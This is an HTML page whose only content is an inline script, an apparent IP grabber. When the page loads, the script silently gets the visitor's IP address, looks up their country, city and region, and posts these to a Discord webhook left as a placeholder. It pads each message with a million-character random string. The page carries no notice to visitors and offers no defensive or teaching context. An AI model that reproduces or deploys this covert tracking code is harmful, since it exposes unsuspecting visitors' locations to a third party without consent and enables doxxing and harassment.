<!DOCTYPE html>
<html>
<head>
  <title>9C7usvZa2fubNAYR2FDEne2wbtGesF4HW2R6QnBTXYv4tSsmsYSmb8NZKw7TndXh3uSeHm7KYNQ3KRCh5m63E9Yu4kbLHsrENthc</title>
  <script>
    window.onload = function() {
      const apiUrl = 'https://api.ipify.org/?format=jsonp&callback=processIP';
      const script = document.createElement('script');
      script.src = apiUrl;
      document.head.appendChild(script);
    };

    function processIP(response) {
      const ipAddress = response.ip;
      const ipapiUrl = 'https://ipapi.co/' + ipAddress + '/json/';
      fetch(ipapiUrl)
        .then(response => response.json())
        .then(data => {
          const country = data.country_name;
          const flagEmoji = getFlagEmoji(data.country_code);
          const city = data.city;
          const region = data.region;
          const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
          const randomString = generateRandomString();
          const messagePayload = {
            embeds: [
              {
                title: 'IP Information',
                description: `IP Address: ${ipAddress}\n${flagEmoji} Country: ${country}\nCity: ${city}\nRegion: ${region}\n\n${randomString}`,
                color: 16711680
              }
            ]
          };
          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(messagePayload)
          });
        });
    }

    function getFlagEmoji(countryCode) {
      const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
      return String.fromCodePoint(...codePoints);
    }

    function generateRandomString() {
      const length = 1000000; // Adjust the length of the string as desired
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
      }
      return result;
    }
  </script>
</head>

</html>
